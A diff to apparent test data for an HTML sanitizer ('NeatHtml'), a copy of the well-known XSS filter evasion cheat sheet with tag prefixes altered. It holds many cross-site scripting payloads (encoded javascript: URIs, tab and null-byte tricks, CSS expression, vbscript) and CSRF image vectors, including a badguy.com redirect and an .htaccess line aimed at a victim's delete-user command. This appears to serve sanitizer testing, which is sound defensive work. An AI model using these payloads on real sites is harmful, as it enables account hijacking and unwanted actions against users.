@@ -64,22 +64,22 @@ in any modern browser so they are omitted here):
 JavaScript directive in context of an image, but it does in other contexts, but 
 the following show the principles that would work in other tags as well - I'll 
 probably revise this at a later date):
-      <NeatHtmlReplace_IMG SRC_NeatHtmlReplace="javascript:alert('XSS');">
+      <IMG SRC_NeatHtmlReplace="javascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       No quotes and no semicolon:
-      <NeatHtmlReplace_IMG SRC_NeatHtmlReplace="javascript:alert('XSS')">
+      <IMG SRC_NeatHtmlReplace="javascript:alert('XSS')">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Case insensitive XSS attack vector:
-      <NeatHtmlReplace_IMG SRC_NeatHtmlReplace="JaVaScRiPt:alert('XSS')">
+      <IMG SRC_NeatHtmlReplace="JaVaScRiPt:alert('XSS')">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       HTML entities (the semicolons are required for this to work):
-      <NeatHtmlReplace_IMG SRC_NeatHtmlReplace="javascript:alert(&quot;XSS&quot;)">
+      <IMG SRC_NeatHtmlReplace="javascript:alert(&quot;XSS&quot;)">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -104,7 +104,7 @@ HTML tag:
       fromCharCode (if no quotes of any kind are allowed you can eval() a 
 fromCharCode in JavaScript to create any XSS vector you need). Click here to 
 build your own (thanks to Hannes Leopold):
-      <NeatHtmlReplace_IMG SRC_NeatHtmlReplace="javascript:alert(String.fromCharCode(88,83,83))">
+      <IMG SRC_NeatHtmlReplace="javascript:alert(String.fromCharCode(88,83,83))">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -140,13 +140,13 @@ SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
-      Embedded tab to break up the cross site scripting attack: <NeatHtmlReplace_IMG SRC_NeatHtmlReplace="jav 
+      Embedded tab to break up the cross site scripting attack: <IMG SRC_NeatHtmlReplace="jav 
 ascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Embedded encoded tab to break up XSS:
-      <NeatHtmlReplace_IMG SRC_NeatHtmlReplace="jav&#x09;ascript:alert('XSS');">
+      <IMG SRC_NeatHtmlReplace="jav&#x09;ascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -154,7 +154,7 @@ ascript:alert('XSS');">
 chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 
 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii 
 chart for more details. The following four XSS examples illustrate this vector:
-      <NeatHtmlReplace_IMG SRC_NeatHtmlReplace="jav&#x0A;ascript:alert('XSS');">
+      <IMG SRC_NeatHtmlReplace="jav&#x0A;ascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -162,14 +162,14 @@ chart for more details. The following four XSS examples illustrate this vector:
 making these strings longer than they have to be because the zeros could be 
 omitted. Often I've seen filters that assume the hex and dec encoding has to be 
 two or three characters. The real rule is 1-7 characters.):
-      <NeatHtmlReplace_IMG SRC_NeatHtmlReplace="jav&#x0D;ascript:alert('XSS');">
+      <IMG SRC_NeatHtmlReplace="jav&#x0D;ascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Multiline Injected JavaScript using ASCII carriage returns (same as above 
 only a more extreme example of this XSS vector) these are not spaces just one 
 of the three characters as described above:
-      <NeatHtmlReplace_IMG SRC_NeatHtmlReplace=" j a v a s c r i p t : a l e r t ( ' X S S ' ) " >
+      <IMG SRC_NeatHtmlReplace=" j a v a s c r i p t : a l e r t ( ' X S S ' ) " >
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -182,7 +182,7 @@ older versions of Opera (circa 7.11 on Windows) were vulnerable to one
 additional char 173 (the soft hypen control char). But the null char %00 is 
 much more useful and helped me bypass certain real world filters with a 
 variation on this example:
-      perl -e 'print "<NeatHtmlReplace_IMG SRC_NeatHtmlReplace="java\0script:alert(\&quot;XSS\&quot;)">";' > out
+      perl -e 'print "<IMG SRC_NeatHtmlReplace="java\0script:alert(\&quot;XSS\&quot;)">";' > out
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -199,7 +199,7 @@ useful if the pattern match doesn't take into account spaces in the word
 "javascript:" -which is correct since that won't render- and makes the false 
 assumption that you can't have a space between the quote and the "javascript:" 
 keyword. The actual reality is you can have any char from 1-32 in decimal):
-      <NeatHtmlReplace_IMG SRC_NeatHtmlReplace=" &#14; javascript:alert('XSS');">
+      <IMG SRC_NeatHtmlReplace=" &#14; javascript:alert('XSS');">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -454,12 +454,12 @@ using the AUTOREVERSE attribute.)
 
 
       IMG Dynsrc:
-      <NeatHtmlReplace_IMG DYNSRC_NeatHtmlReplace="javascript:alert('XSS')">
+      <IMG DYNSRC_NeatHtmlReplace="javascript:alert('XSS')">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       IMG lowsrc:
-      <NeatHtmlReplace_IMG LOWSRC_NeatHtmlReplace="javascript:alert('XSS')">
+      <IMG LOWSRC_NeatHtmlReplace="javascript:alert('XSS')">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -543,17 +543,17 @@ url("javascript:alert('XSS')");}</NeatHtmlReplace_STYLE><UL><LI>XSS
 
 
       VBscript in an image:
-      <NeatHtmlReplace_IMG SRC_NeatHtmlReplace='vbscript:msgbox("XSS")'>
+      <IMG SRC_NeatHtmlReplace='vbscript:msgbox("XSS")'>
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
       Mocha (older versions of Netscape only):
-      <NeatHtmlReplace_IMG SRC_NeatHtmlReplace="mocha:[code]">
+      <IMG SRC_NeatHtmlReplace="mocha:[code]">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02] [NS4]
 
 
       Livescript (older versions of Netscape only):
-      <NeatHtmlReplace_IMG SRC_NeatHtmlReplace="livescript:[code]">
+      <IMG SRC_NeatHtmlReplace="livescript:[code]">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02] [NS4]
 
 
@@ -654,7 +654,7 @@ into an infinite loop of alerts):
 
       STYLE attribute using a comment to break up expression (Thanks to Roman 
 Ivanov for this one):
-      <NeatHtmlReplace_IMG STYLE_NeatHtmlReplace="xss:expr/*XSS*/ession(alert('XSS'))">
+      <IMG STYLE_NeatHtmlReplace="xss:expr/*XSS*/ession(alert('XSS'))">
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
 
@@ -813,7 +813,7 @@ protection works with other commands on the same domain. This can be used to
 delete users, add users (if the user who visits the page is an administrator), 
 send credentials elsewhere, etc.... This is one of the lesser used but more 
 useful XSS vectors:
-      <NeatHtmlReplace_IMG SRC_NeatHtmlReplace="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"
+      <IMG SRC_NeatHtmlReplace="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"
 >
       Browser support: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
 
@@ -821,7 +821,7 @@ useful XSS vectors:
       IMG Embedded commands part II - this is more scary because there are 
 absolutely no identifiers that make it look suspicious other than it is not 
 hosted on your own domain. The vector uses a 302 or 304 (others work too) to 
-redirect the image back to a command. So a normal <NeatHtmlReplace_IMG SRC_NeatHtmlReplace="http://badguy.com/a.jpg"> could actually be an attack vector to run 
+redirect the image back to a command. So a normal <IMG SRC_NeatHtmlReplace="http://badguy.com/a.jpg"> could actually be an attack vector to run 
 commands as the user who views the image link. Here is the .htaccess (under 
 Apache) line to accomplish the vector (thanks to Timo for part of this):
       Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
